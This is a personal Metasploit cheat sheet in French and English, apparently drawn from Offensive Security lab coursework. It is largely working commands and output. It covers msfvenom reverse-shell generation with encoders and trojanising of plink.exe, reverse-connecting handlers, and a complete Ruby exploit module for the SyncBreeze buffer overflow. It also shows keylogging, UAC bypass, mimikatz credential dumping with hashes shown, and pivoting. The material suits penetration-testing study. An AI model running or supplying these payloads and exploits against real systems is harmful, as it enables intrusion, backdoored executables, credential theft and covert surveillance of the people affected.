# metasploit.md

## batching execution

create a file and input all commands. For exemple, create `inject.rc` file :

```shell
use exploit/multi/http/spring_cloud_function_spel_injection
set payload linux/x64/meterpreter/reverse_tcp
set RHOSTS 10.10.11.204
set SRVHOST tun0        
set LHOST tun0
set LPORT 4445
show options
run
```

Execute with :

```shell
msfconsole -q -r inject.rc
```

## Multi-handler

```text
use exploit/multi/handler
setg LHOST tun0
setg LPORT 4444
setg RHOSTS ${TARGET_IP}
setg EXITFUNC thread
set PAYLOAD generic/shell_reverse_tcp
```

Make sure your payload’s exit function is set to thread and use a generic reverse shell.











### metasploit

see also: https://wiki.archlinux.org/title/Metasploit_Framework



### Older Systems


#### Metasploit / meterpreter
##### Metasploit / meterpreter on Windows XP


https://forums.offensive-security.com/showthread.php?28177-Alice-stuck&highlight=10.11.1.5%3A445%20-%20Exploit%20failed
**Meterpreter isn't stable against Windows XP  SP2 on MSF 6 #14473 :** https://github.com/rapid7/metasploit-framework/issues/14473
=> Windows Meterpreter no longer supports systems prior to Windows XP SP2.


Utiliser un shell classique ( nc ), ou tenter metasploit avec une payload autre que meterpreter










#### The Metasploit Framework (MSF)
Start the console :
```bash
$ sudo msfconsole -q
```

search for the MS08_067 vulnerability:
```
msf> search ms08_067
```

Use "search" command to to find an exploit, there are many options (search -h)






### Metasploit Framework

#### searchsploit 

Search for an exploit in https://www.exploit-db.com:
```
searchsploit afd windows -w -t
--------------------------------------------------------------------------------------
Exploit Title | URL
--------------------------------------------------------------------------------------
Microsoft Windows (x86) - 'afd.sys' Privil | https://www.exploit-db.com/exploits/40564
Microsoft Windows - 'AfdJoinLeaf' Privileg | https://www.exploit-db.com/exploits/21844
Microsoft Windows - 'afd.sys' Local Kernel | https://www.exploit-db.com/exploits/18755
Microsoft Windows 7 (x64) - 'afd.sys' Dang | https://www.exploit-db.com/exploits/39525
Microsoft Windows 7 (x86) - 'afd.sys' Dang | https://www.exploit-db.com/exploits/39446
Microsoft Windows 7 Kernel - Pool-Based Ou | https://www.exploit-db.com/exploits/42009
Microsoft Windows XP - 'afd.sys' Local Ker | https://www.exploit-db.com/exploits/17133
Microsoft Windows XP/2003 - 'afd.sys' Priv | https://www.exploit-db.com/exploits/6757
Microsoft Windows XP/2003 - 'afd.sys' Priv | https://www.exploit-db.com/exploits/18176
--------------------------------------------------------------------------------------
```

```
# msf-pattern
msf-pattern_create -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac
8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A
f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5
Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak
```

Ensuite, lorsque l'on a l'adresse de l'EIP (exemple : 42306142), on retrouve l'offset dans ce buffer :

```
msf-pattern_offset -l 800 -q 42306142
[*] Exact match at offset 780
```

Ou:
```
$ msf-pattern_offset -q 42306142
```

#### NASM
Compile assembly
```
msf-nasm_shell
nasm  jmp esp
00000000 FFE4 jmp esp
nasm 
```





#### Msfvenom
Lister les payload :
```
msfvenom -l payloads
```

Générer une payload :
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.191 LPORT=443 -f c
```

`-p windows/shell_reverse_tcp` = la payload
`LHOST=192.168.191.119 LPORT=443` = paramètres de la payload (ici: l'IP à appeler, port)
`-f c` : sortie formatée en code C

Idem, en excluant des caractères/octets spécifiques :
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.191 LPORT=443 -f c -e x86/shikata_ga_nai -b "x00x0ax0dx25x26x2bx3d"
```
`-e x86/shikata_ga_nai` = utilisation de l'encodeur polymorphique
`-b "x00x0ax0dx25x26x2bx3d"` = caractères/octets à exclure

Avec la gestion de la sortie du thread (au lieu du process) :
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.191 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "x00x0ax0dx25x26x2bx3d"
```

`EXITFUNC=thread`








#### Example 2: rechercher un exploit
```bash
$ searchsploit afd windows -w -t
```
`afd windows` : mots recherchés

```bash
$ searchsploit afd windows -w -t | grept http | cut -f 2 -d "|"
```

```bash
$ for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|" ); do 
exp_name=$(echo $e | cut -d "/" -f 5) && url=$(echo $e | sed 's/exploits/raw/') && wget -q --no-check-certificate $url -O $exp_name;
done
```





















## 22. The Metasploit Framework   

```ad-note
https://forums.offensive-security.com/showthread.php?28177-Alice-stuck&highlight=10.11.1.5%3A445%20-%20Exploit%20failed
**Meterpreter isn't stable against Windows XP  SP2 on MSF 6 #14473 :** https://github.com/rapid7/metasploit-framework/issues/14473
=> Windows Meterpreter no longer supports systems prior to Windows XP SP2.

Workaround: do not use meterpreter, use a reverse-shell via netcat
```

### Setup
```
$ sudo systemctl start postgresql

$ sudo systemctl enable postgresql

$ sudo msfdb init
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

### Update
```
$ sudo apt update; sudo apt install metasploit-framework
```

### Start
```
$ sudo msfconsole -q
msf5 >
```

### Getting Help
```
msf5 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions

msf5 auxiliary(scanner/portscan/tcp) > show options
Module options (auxiliary/scanner/portscan/tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
CONCURRENCY 10 yes The number of concurrent ports to check per
DELAY 0 yes The delay between connections, per thread,
JITTER 0 yes The delay jitter factor (maximum value by w
PORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
RHOSTS yes The target address range or CIDR identifier
THREADS 1 yes The number of concurrent threads
TIMEOUT 1000 yes The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.11.0.22
RHOSTS => 10.11.0.22

msf5 auxiliary(scanner/portscan/tcp) > run
[+] 10.11.0.22: - 10.11.0.22:80 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:135 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:139 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:445 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:3389 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:5040 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:9121 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 > info exploit/windows/http/syncbreeze_bof
Name: Sync Breeze Enterprise GET Buffer Overflow
Module: exploit/windows/http/syncbreeze_bof
Platform: Windows
Arch:
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Great
Disclosed: 2017-03-15
Provided by:
Daniel Teixeira
Andrew Smith
Owais Mehtab
Milton Valencia (wetw0rk)
Available targets:
Id Name
-- ----
0 Automatic
1 Sync Breeze Enterprise v9.4.28
2 Sync Breeze Enterprise v10.0.28
3 Sync Breeze Enterprise v10.1.16
Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
Proxies no A proxy chain of format type:host:port[,type:hos
```


### Auxiliary modules

provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more

```
msf5 > show auxiliary
Auxiliary
=========
Name Rank Description
---- ---- -----------
................
scanner/smb/smb1 normal SMBv1 Protocol Detection
scanner/smb/smb2 normal SMB 2.0 Protocol Detection
scanner/smb/smb_enumshares normal SMB Share Enumeration
scanner/smb/smb_enumusers normal SMB User Enumeration (SAM EnumUsers)
scanner/smb/smb_enumusers_domain normal SMB Domain User Enumeration
scanner/smb/smb_login normal SMB Login Check Scanner
scanner/smb/smb_lookupsid normal SMB SID User Enumeration (LookupSid)
scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection
scanner/smb/smb_version normal SMB Version Detection
................

msf5 > search type:auxiliary name:smb
Matching Modules
================
Name Rank Description
---- ---- -----------
auxiliary/admin/oracle/ora_ntlm_stealer normal Oracle SMB Relay Code Execution
auxiliary/admin/smb/check_dir_file normal SMB Scanner Check File/Directory
auxiliary/admin/smb/delete_file normal SMB File Delete Utility
auxiliary/admin/smb/download_file normal SMB File Download Utility
...
```

### Commands

#### Search

```
msf5 > search syncbreeze
Matching Modules
================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
exploit/windows/fileformat/syncbreeze_xml 2017-03-29 normal Sync Breeze Enterprise 9.5.16 - Import Command Buffer Overflow
exploit/windows/http/syncbreeze_bof 2017-03-15 great Sync Breeze Enterprise GET Buffer Overflow

msf5 > search meterpreter type:payload
Matching Modules
================
# Name Description
- ---- -----------
1 payload/android/meterpreter/reverse_http Android Meterpreter, Android
2 payload/android/meterpreter/reverse_https Android Meterpreter, Android
3 payload/android/meterpreter/reverse_tcp Android Meterpreter, Android
4 payload/android/meterpreter_reverse_http Android Meterpreter Shell, R
```

#### All available file formats for msfvenom
```
msfvenom -l formats
Framework Executable Formats [--format <value>]
===============================================
Name
----
asp
aspx
aspx-exe
axis2
dll
elf
elf-so
exe
...
```

### Meterpreter

```
meterpreter > sysinfo
Computer : CLIENT251
OS : Windows 10 (Build 16299).
Architecture : x86
System Language : en_US
Domain : corp
Logged On Users : 7
Meterpreter : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
[*] uploading :/usr/share/windows-resources/binaries/nc.exe -> c:\Users\Offsec
[*] uploaded :/usr/share/windows-resources/binaries/nc.exe -> c:\Users\Offsec\nc.exe

meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
[*] Downloading: c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] Downloaded 25.50 KiB (100.0%): c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] download : c:\Windows\system32\calc.exe -> /tmp/calc.exe

meterpreter > shell
Process 3488 created.
Channel 3 created.

C:\Windows\system32>
```

### Create meterpreter payload

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 9 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai succeeded with size 378 (iteration=1)
x86/shikata_ga_nai succeeded with size 405 (iteration=2)
x86/shikata_ga_nai succeeded with size 432 (iteration=3)
x86/shikata_ga_nai succeeded with size 459 (iteration=4)
x86/shikata_ga_nai succeeded with size 486 (iteration=5)
x86/shikata_ga_nai succeeded with size 513 (iteration=6)
x86/shikata_ga_nai succeeded with size 540 (iteration=7)
x86/shikata_ga_nai succeeded with size 567 (iteration=8)
x86/shikata_ga_nai chosen with final size 567
Payload size: 567 bytes
Final size of exe file: 73802 bytes
Saved as: shell_reverse_msf_encoded.exe
```

Or inject in another executable :
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 9 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai succeeded with size 378 (iteration=1)
x86/shikata_ga_nai succeeded with size 405 (iteration=2)
x86/shikata_ga_nai succeeded with size 432 (iteration=3)
x86/shikata_ga_nai succeeded with size 459 (iteration=4)
x86/shikata_ga_nai succeeded with size 486 (iteration=5)
x86/shikata_ga_nai succeeded with size 513 (iteration=6)
x86/shikata_ga_nai succeeded with size 540 (iteration=7)
x86/shikata_ga_nai succeeded with size 567 (iteration=8)
x86/shikata_ga_nai chosen with final size 567
Payload size: 567 bytes
Final size of exe file: 311296 bytes
Saved as: shell_reverse_msf_encoded_embedded.exe
```

Or from MSF console :
```
msf5 > use payload/windows/shell_reverse_tcp

msf5 payload(windows/shell_reverse_tcp) > set LHOST 10.11.0.4
`LHOST => 10.11.0.4
msf5 payload(windows/shell_reverse_tcp) > set LPORT 443
LPORT => 443
msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
[*] Writing 311296 bytes to shell_reverse_msf_encoded_embedded.exe...
```

#### Transport

Change the transport during a meterpreter shell :
```
meterpreter > transport list
Session Expiry : @ 2019-10-09 17:01:44
ID Curr URL
-- ---- ---
1 * [http://10.11.0.4:4444/gFojKgv3qFbA1MHVmlpPUgxwS_f66dxGRl8ZqbZZTkyCuJFjeAaDK/](http://10.11.0.4:4444/gFojKgv3qFbA1MHVmlpPUgxwS_f66dxGRl8ZqbZZTkyCuJFjeAaDK/)

meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
[*] Adding new transport ...
[+] Successfully added reverse_tcp transport.

meterpreter > transport list
Session Expiry : @ 2019-10-09 17:01:44
ID Curr URL
-- ---- ---
1 * [http://10.11.0.4:4444/](http://10.11.0.4:4444/)
```

### Metasploit Exploit Multi Handler   

To connect to the payload (reverse shell for example), from MSF, instead of using `netcat` :
```
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https

msf5 exploit(multi/handler) > show options
Module options (exploit/multi/handler):
Name Current Setting Required Description
---- --------------- -------- -----------
Payload options (windows/meterpreter/reverse_https):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique (Accepted: '', seh, thread, pro
LHOST yes The local listener hostname
LPORT 8443 yes The local listener port
LURI no The HTTP Path
Exploit target:
Id Name
-- ----
0 Wildcard Target

msf5 exploit(multi/handler) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf5 exploit(multi/handler) > exploit
[*] Started HTTP reverse handler on [https://10.11.0.4:443](https://10.11.0.4:443)
```

#### Advanced Features and Transports

```
msf5 exploit(multi/handler) > show advanced
Module advanced options (exploit/multi/handler):
Name Current Setting Required Description
---- --------------- -------- -----------
ContextInformationFile no The information file that contains
DisablePayloadHandler false no Disable the handler code for the se
EnableContextEncoding false no Use transient context when encoding
ExitOnSession true yes Return from the exploit after a ses
ListenerTimeout 0 no The maximum number of seconds to wa
VERBOSE false no Enable detailed status messages
WORKSPACE no Specify the workspace for this modu
WfsDelay 0 no Additional delay when waiting for a
Payload advanced options (windows/meterpreter/reverse_https):
Name Current Setting Required Description
---- --------------- -------- -----------
AutoLoadStdapi true yes Automatically load the Stdapi extension
AutoRunScript no A script to run automatically on session
AutoSystemInfo true yes Automatically capture system information
AutoUnhookProcess false yes Automatically load the unhook extension
...
```

#### Payload encoding, and avoid bad chars
```
msf5 exploit(multi/handler) > set EnableStageEncoding true
EnableStageEncoding => true
msf5 exploit(multi/handler) > set StageEncoder x86/shikata_ga_nai
StageEncoder => x86/shikata_ga_nai

msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 2.
[*] Started HTTPS reverse handler on [https://10.11.0.4:443](https://10.11.0.4:443)
msf5 exploit(multi/handler) >
[*] [https://10.11.0.4:443](https://10.11.0.4:443) handling request from 10.11.0.22; Encoded stage with x86/shikata_ga_nai
[*] [https://10.11.0.4:443](https://10.11.0.4:443) handling request from 10.11.0.22; Staging x86 payload (18085
[*] Meterpreter session 4 opened (10.11.0.4:443 -> 10.11.0.22:51270)
msf5 exploit(multi/handler) >
```

#### Run a script when connection is established

```
msf5 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users
AutoRunScript => windows/gather/enum_logged_on_users
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 3.
[*] Started HTTPS reverse handler on [https://10.11.0.4:443](https://10.11.0.4:443)
msf5 exploit(multi/handler) >
[*] [https://10.11.0.4:443](https://10.11.0.4:443) handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 5 opened (10.11.0.4:443 -> 10.11.0.22:51275)
[*] Session ID 5 (10.11.0.4:443 -> 10.11.0.22:51275) processing AutoRunScript 'windows/gather/enum_logged_on_users'
[*] Running against session 5
Current Logged Users
SID User
--- ----
S-1-5-21-3048852426-3234707088-723452474-1103 corp\offsec
S-1-5-21-3426091779-1881636637-1944612440-1001 CLIENT251\admin
..............
```

### Custom MSF module
```
$ sudo mkdir -p /root/.msf4/modules/exploits/windows/http
$ sudo cp /usr/share/metasploitframework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb

$ sudo nano /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
```

```ruby
##
# This module requires Metasploit: [http://metasploit.com/download](http://metasploit.com/download)
# Current source: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
##
class MetasploitModule < Msf::Exploit::Remote

	Rank = ExcellentRanking
	include Msf::Exploit::Remote::HttpClient

def initialize(info = {})
	super(update_info(info,
		'Name' => 'SyncBreeze Enterprise Buffer Overflow',
		'Description' => %q(
			This module ports our python exploit of SyncBreeze Enterprise 10.0.28 to MSF.
		),
		'License' => MSF_LICENSE,
		'Author' => [ 'Offensive Security', 'offsec' ],
		'References' => [
			[ 'EDB', '42886' ]
		],
		'DefaultOptions' => {
			'EXITFUNC' => 'thread'
		},
		'Platform' => 'win',
		'Payload' => {
			'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",
			'Space' => 500
		},
		'Targets' => [
			[ 'SyncBreeze Enterprise 10.0.28', {
				'Ret' => 0x10090c83, # JMP ESP -- libspp.dll
				'Offset' => 780
			} ]
		],
		'Privileged' => true,
		'DisclosureDate' => 'Oct 20 2019',
		'DefaultTarget' => 0
	) )
	
		register_options([Opt::RPORT(80)])
	end

	def check
        res = send_request_cgi(
			'uri' => '/',
			'method' => 'GET'
		)
		if res && res.code == 200
			product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
			if product_name =~ /10\.0\.28/
				return Exploit::CheckCode::Appears
			end
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		print_status("Generating exploit...")
		exp = rand_text_alpha(target['Offset'])
		exp << [target.ret].pack('V')
		exp << rand_text(4)
		exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
		exp << payload.encoded
		print_status("Sending exploit...")
		send_request_cgi(
			'uri' => '/login',
			'method' => 'POST',
			'connection' => 'keep-alive',
			'vars_post' => {
				'username' => "#{exp}",
				'password' => "fakepsw"
			}
		)
        handler
		disconnect
	end
end
```

### Post-Exploitation   
```
meterpreter > screenshot
Screenshot saved to:/root/.msf4/modules/exploits/windows/http/syncbreeze/beVjSnrB.jpeg
```

Key logger :
```
meterpreter > keyscan_start
Starting the keystroke sniffer ...

meterpreter > keyscan_dump
Dumping captured keystrokes...

ipconfig<CR>
whoami<CR>

meterpreter > keyscan_stop
Stopping the keystroke sniffer...

meterpreter >
```

#### Monitor process :
```
meterpreter > ps
Process List
============
PID PPID Name Arch Session User Path
--- ---- ---- ---- ------- ---- ----
...
3116 904 WmiPrvSE.exe
3164 3568 shell_reverse_msf_encoded.exe x86 1 corp\offsec C:\Users\Offsec.corp\Desktop\shell_reverse_msf_encoded.exe
3224 808 msdtc.exe
3360 1156 sihost.exe x86 1 corp\offsec C:\Windows\System32\sihost.exe
3544 808 syncbrs.exe
3568 1960 explorer.exe x86 1 corp\offsec C:\Windows\explorer.exe
3820 808 svchost.exe x86 1 corp\offsec C:\Windows\System32\svchost.exe
...
```

#### Migrate meterpreter shell to another process :
```
meterpreter > migrate 3568
[*] Migrating from 3164 to 3568...
[*] Migration completed successfully.
```

#### Bypass UAC :
```
msf5 > use exploit/windows/local/bypassuac_injection_winsxs
msf5 exploit(windows/local/bypassuac_injection_winsxs) > show options
Module options (exploit/windows/local/bypassuac_injection_winsxs):
Name Current Setting Required Description
---- --------------- -------- -----------
SESSION yes The session to run this module on.

Exploit target:
Id Name
-- ----
0 Windows x86

msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10
SESSION => 10

msf5 exploit(windows/local/bypassuac_injection_winsxs) > exploit
[*] Started reverse TCP handler on 10.11.0.4:4444
[+] Windows 10 (Build 16299). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Creating temporary folders...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 5800
[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Meterpreter session 11 opened (10.11.0.4:4444 -> 10.11.0.22:53870)
```

#### powershell
```
meterpreter > load powershell
Loading extension powershell...Success.

meterpreter > help powershell
Powershell Commands
===================
Command Description
------- -----------
powershell_execute Execute a Powershell command string
powershell_import Import a PS1 script or .NET Assembly DLL
powershell_shell Create an interactive Powershell prompt

meterpreter > powershell_execute "$PSVersionTable.PSVersion"
[+] Command execution completed:
Major Minor Build Revision
----- ----- ----- --------
5 1 16299 248

meterpreter >
```

#### Mimikatz
```
meterpreter > load kiwi
Loading extension kiwi...
Success.

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============
Username Domain NTLM SHA1 DPAPI
-------- ------ ---- ---- -----
CLIENT251$ corp 4d4ae0e7cb16d4cfe6a91412b3d80ed4
5262a3692e319ca71ac2dfdb2f758e502adbf154
offsec corp e2b475c11da2a0748290d87aa966c327
8c77f430e4ab8acb10ead387d64011c76400d26e c10c264a27b63c4e66728bbef4be8aab
meterpreter >
```

#### Pivoting

Add a route to a subnet through a meterpreter session ID (`msf> sessions`)
```
msf5 > route add 192.168.1.0/24 11
[*] Route added

msf5 > route print
IPv4 Active Routing Table
=========================
Subnet Netmask Gateway
------ ------- -------
192.168.1.0 255.255.255.0 Session 11
```

Or with "autoroute" :
```
msf5 exploit(multi/handler) > use multi/manage/autoroute
msf5 post(multi/manage/autoroute) > show options
Module options (post/multi/manage/autoroute):
Name Current Setting Required Description
---- --------------- -------- -----------
CMD autoadd yes Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
NETMASK 255.255.255.0 no Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
SESSION yes The session to run this module on.
SUBNET no Subnet (IPv4, for example, 10.10.10.0)
msf5 post(multi/manage/autoroute) > sessions -l
Active sessions
===============
Id Name Type Information
Connection
-- ---- ---- ----------- ---------
-
4 meterpreter x86/windows NT AUTHORITY\SYSTEM @ WIN10-X86 10.11.0.4:5555 -> 10.11.0.22:1883 (10.11.0.22)
msf5 post(multi/manage/autoroute) > set session 4
session => 4
msf5 post(multi/manage/autoroute) > exploit
[!] SESSION may not be compatible with this module.
[*] Running module against CLIENT251
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.1.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 10.11.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from Fortinet virtual adapter.
[*] Post module execution completed

msf5 post(multi/manage/autoroute) >
```

#### Add a sock4 proxy
```
msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) > show options
Module options (auxiliary/server/socks4a):
Name Current Setting Required Description
---- --------------- -------- -----------
SRVHOST 0.0.0.0 yes The address to listen on
SRVPORT 1080 yes The port to listen on.
Auxiliary action:
Name Description
---- -----------
Proxy

msf5 auxiliary(server/socks4a) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf5 auxiliary(server/socks4a) > exploit -j
[*] Auxiliary module running as background job 0.
[*] Starting the socks4a proxy server
```

```
sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
sudo proxychains rdesktop 192.168.1.110
ProxyChains-3.1 ([http://proxychains.sf.net](http://proxychains.sf.net))
Autoselected keyboard map en-us
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.110:3389-<><>-OK
ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.110:3389-<><>-OK
```

#### Port forwarding
```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
-L <opt> Forward: local host to listen on (optional). Reverse: local host to conn
-R Indicates a reverse port forward.
-h Help banner.
-i <opt> Index of the port forward entry to interact with (see the "list" command
-l <opt> Forward: local port to listen on. Reverse: local port to connect to.
-p <opt> Forward: remote port to connect to. Reverse: remote port to listen on.
-r <opt> Forward: remote host to connect to.

meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
[*] Local TCP relay created: :3389 <-> 192.168.1.110:3389
```

Then :
```
rdesktop 127.0.0.1
Autoselected keyboard map en-us
ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized?
Connection established using SSL.
WARNING: Remote desktop does not support colour depth 24; falling back to 16
```

### Automation

Put all commands in a file, example `setup.rc` :
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z
```

And execute :
```
sudo msfconsole -r setup.rc
```

